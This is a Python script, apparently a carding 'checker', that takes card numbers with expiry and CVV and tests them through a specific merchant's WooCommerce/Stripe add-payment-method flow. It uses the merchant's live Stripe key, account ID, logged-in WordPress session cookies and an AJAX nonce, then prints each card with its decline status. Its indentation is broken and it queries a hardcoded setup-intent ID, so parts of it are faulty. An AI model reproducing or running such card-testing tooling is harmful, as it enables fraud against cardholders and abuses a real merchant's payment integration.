import requests
import json

def verificar_stripe(numero, mes, ano, cvv):
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'es-CL,es-419;q=0.9,es;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    data = (
        f'billing_details[name]=+&billing_details[email]=carocev565%40pngzero.com'
        f'&billing_details[address][country]=MX&type=card&card[number]={numero}'
        f'&card[cvc]={cvv}&card[exp_year]={ano}&card[exp_month]={mes}'
        '&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F0089f5e1e2%3B+stripe-js-v3%2F0089f5e1e2%3B+payment-element%3B+deferred-intent'
        '&referrer=https%3A%2F%2Fjokermartini.com&time_on_page=144902'
        '&client_attribution_metadata[client_session_id]=3d4eef6e-44df-42b5-8c5b-2d420e60411f'
        '&client_attribution_metadata[merchant_integration_source]=elements'
        '&client_attribution_metadata[merchant_integration_subtype]=payment-element'
        '&client_attribution_metadata[merchant_integration_version]=2021'
        '&client_attribution_metadata[payment_intent_creation_flow]=deferred'
        '&client_attribution_metadata[payment_method_selection_flow]=merchant_specified'
        '&guid=0a144a1a-732d-4329-977e-58574ce0644ab29d8e'
        '&muid=e6de3b93-3fe8-4f1d-bc4d-27222898d33c110de2'
        '&sid=afab86b4-df87-42cf-8b22-b29e260122b6b3dda8'
        '&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs'
        '&_stripe_account=acct_1MhxEe2E4DlvoUHX'
    )

    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    pm = r1.json().get('id')

    # Cookies y headers para segunda petición
    cookies = {
    'wordpress_sec_d54e43eaa37aa8f9a717d50d5af897a6': 'carocev565%7C1750724643%7CxkZUKClk9SE2yjBQPtYvxZaI7WPKQax5QxWCFPwMXdX%7Cce05e6da3df52b2c818b193179ce1c9d181231ac2eb8571487f9d719760cc496',
    '_ga': 'GA1.2.992584935.1749515008',
    '_gid': 'GA1.2.1193624289.1749515008',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-06-10%2000%3A23%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fjokermartini.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-06-10%2000%3A23%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fjokermartini.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F137.0.0.0%20Mobile%20Safari%2F537.36',
    'wordpress_logged_in_d54e43eaa37aa8f9a717d50d5af897a6': 'carocev565%7C1750724643%7CxkZUKClk9SE2yjBQPtYvxZaI7WPKQax5QxWCFPwMXdX%7C8ae6a64839a109ea06adcf042577d8da61f96984f3ba3997db4f40aac159e357',
    '_ga_626V573VTK': 'GS2.2.s1749515008$o1$g1$t1749515069$j60$l0$h0',
    'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fjokermartini.com%2Fmy-account%2Fadd-payment-method%2F',
    '__ssid': '1b6a5244983a6a022a97c2bcdce1a7e',
    '__stripe_mid': 'e6de3b93-3fe8-4f1d-bc4d-27222898d33c110de2',
    '__stripe_sid': 'afab86b4-df87-42cf-8b22-b29e260122b6b3dda8',

    }

    h2 = {
        'authority': 'jokermartini.com',
        'accept': '*/*',
        'accept-language': 'es-CL,es-419;q=0.9,es;q=0.8',
        'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryrjBxA99pbYSODwQk',
        'origin': 'https://jokermartini.com',
        'referer': 'https://jokermartini.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    files = {
        'action': (None, 'create_setup_intent'),
        'wcpay-payment-method': (None, pm),
        '_ajax_nonce': (None, 'ad37830726'),
    }

    r2 = requests.post(
        'https://jokermartini.com/wp-admin/admin-ajax.php',
        cookies=cookies,
        headers=h2,
        files=files
    )

    if 'data' in r2.json() and 'client_secret' in r2.json()['data']:
    secret = r2.json()['data']['client_secret']
    else:
    
        return "❌ No se pudo obtener el client_secret"
    

    # Última solicitud para verificar estado
    h3 = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'es-CL,es-419;q=0.9,es;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    params = {
        'client_secret': secret,
        'is_stripe_sdk': 'false',
        'key': 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs',
        '_stripe_account': 'acct_1MhxEe2E4DlvoUHX',
    }

    r3 = requests.get(
        'https://api.stripe.com/v1/setup_intents/seti_1RYG1s2E4DlvoUHX9EHKhSqQ',
        params=params,
        headers=h3
    )

    return (
        "Stripe Fast\n"
        "=≈=≈=≈=≈=≈=≈=≈=≈=≈=\n"
        f"❌ {numero}|{mes}|{ano}|{cvv}\n"
        "Status: Decline\n"
        f"Message: {r3.text}"
    )
